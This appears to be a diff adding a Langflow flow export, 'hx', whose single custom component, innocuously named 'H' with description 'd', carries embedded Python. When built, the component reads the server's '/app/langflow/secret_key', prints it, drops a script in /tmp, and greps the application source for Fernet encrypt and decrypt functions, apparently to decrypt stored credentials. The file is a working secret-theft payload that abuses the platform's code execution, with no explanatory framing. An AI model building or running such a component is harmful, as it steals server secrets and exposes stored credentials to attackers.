@@ -1,0 +1,132 @@
+{
+  "id": "0f914442-05dc-49e3-9c7b-91c514b654d0",
+  "data": {
+    "edges": [],
+    "nodes": [
+      {
+        "id": "H-1c415",
+        "data": {
+          "id": "H-1c415",
+          "node": {
+            "beta": false,
+            "icon": "code",
+            "edited": false,
+            "frozen": false,
+            "legacy": false,
+            "pinned": false,
+            "outputs": [
+              {
+                "name": "output",
+                "cache": true,
+                "types": [
+                  "Message"
+                ],
+                "value": "__UNDEFINED__",
+                "hidden": null,
+                "method": "build_out",
+                "options": null,
+                "selected": "Message",
+                "tool_mode": true,
+                "loop_types": null,
+                "allows_loop": false,
+                "display_name": "Output",
+                "group_outputs": false,
+                "required_inputs": null
+              }
+            ],
+            "metadata": {
+              "module": "custom_components.h",
+              "code_hash": "45ceff620b21",
+              "dependencies": {
+                "dependencies": [
+                  {
+                    "name": "langflow",
+                    "version": "0.7.3"
+                  }
+                ],
+                "total_dependencies": 1
+              }
+            },
+            "template": {
+              "code": {
+                "info": "",
+                "list": false,
+                "name": "code",
+                "show": true,
+                "type": "code",
+                "value": "\nfrom langflow.custom import Component\nfrom langflow.io import Output, MessageTextInput\nfrom langflow.schema.message import Message\nimport subprocess\nclass H(Component):\n    display_name=\"H\"\n    description=\"d\"\n    icon=\"code\"\n    name=\"H\"\n    inputs=[MessageTextInput(name=\"input_value\", display_name=\"Input\", value=\"x\")]\n    outputs=[Output(name=\"output\", display_name=\"Output\", method=\"build_out\")]\n    def build_out(self) -> Message:\n        py=r\"\"\"\nsecret=open('/app/langflow/secret_key').read().strip()\nprint('SECRET',secret)\nimport os,sys\nsys.path.insert(0,'/app/src')\n# find encrypt\nimport subprocess\nprint(subprocess.getoutput(\"python -c \\\"import pkgutil,langflow; import langflow as l; print(l.__file__)\\\"\"))\nprint(subprocess.getoutput(\"grep -Rn \\\"class.*Fernet\\\\|def encrypt\\\\|def decrypt\\\\|Fernet(\\\" /app/src --include='*.py' 2>/dev/null | head -40\"))\n\"\"\"\n        open('/tmp/hx.py','w').write(py)\n        return Message(text=subprocess.getoutput('python /tmp/hx.py'))\n",
+                "dynamic": true,
+                "advanced": true,
+                "password": false,
+                "required": true,
+                "fileTypes": [],
+                "file_path": "",
+                "multiline": true,
+                "title_case": false,
+                "placeholder": "",
+                "load_from_db": false
+              },
+              "_type": "Component",
+              "input_value": {
+                "info": "",
+                "list": false,
+                "name": "input_value",
+                "show": true,
+                "type": "str",
+                "value": "x",
+                "dynamic": false,
+                "advanced": false,
+                "required": false,
+                "tool_mode": false,
+                "title_case": false,
+                "_input_type": "MessageTextInput",
+                "input_types": [
+                  "Message"
+                ],
+                "placeholder": "",
+                "display_name": "Input",
+                "load_from_db": false,
+                "override_skip": false,
+                "list_add_label": "Add More",
+                "trace_as_input": true,
+                "trace_as_metadata": true,
+                "track_in_telemetry": false
+              }
+            },
+            "minimized": false,
+            "tool_mode": false,
+            "description": "d",
+            "field_order": [
+              "input_value"
+            ],
+            "base_classes": [
+              "Message"
+            ],
+            "display_name": "H",
+            "output_types": [],
+            "custom_fields": {},
+            "documentation": "",
+            "conditional_paths": []
+          },
+          "type": "H",
+          "description": "d",
+          "display_name": "H"
+        },
+        "type": "genericNode",
+        "position": {
+          "x": 1,
+          "y": 1
+        }
+      }
+    ],
+    "viewport": {
+      "x": 0,
+      "y": 0,
+      "zoom": 1
+    }
+  },
+  "name": "hx",
+  "updated_at": "2026-08-20 06:01:44.02261",
+  "is_component": false,
+  "endpoint_name": null
+}
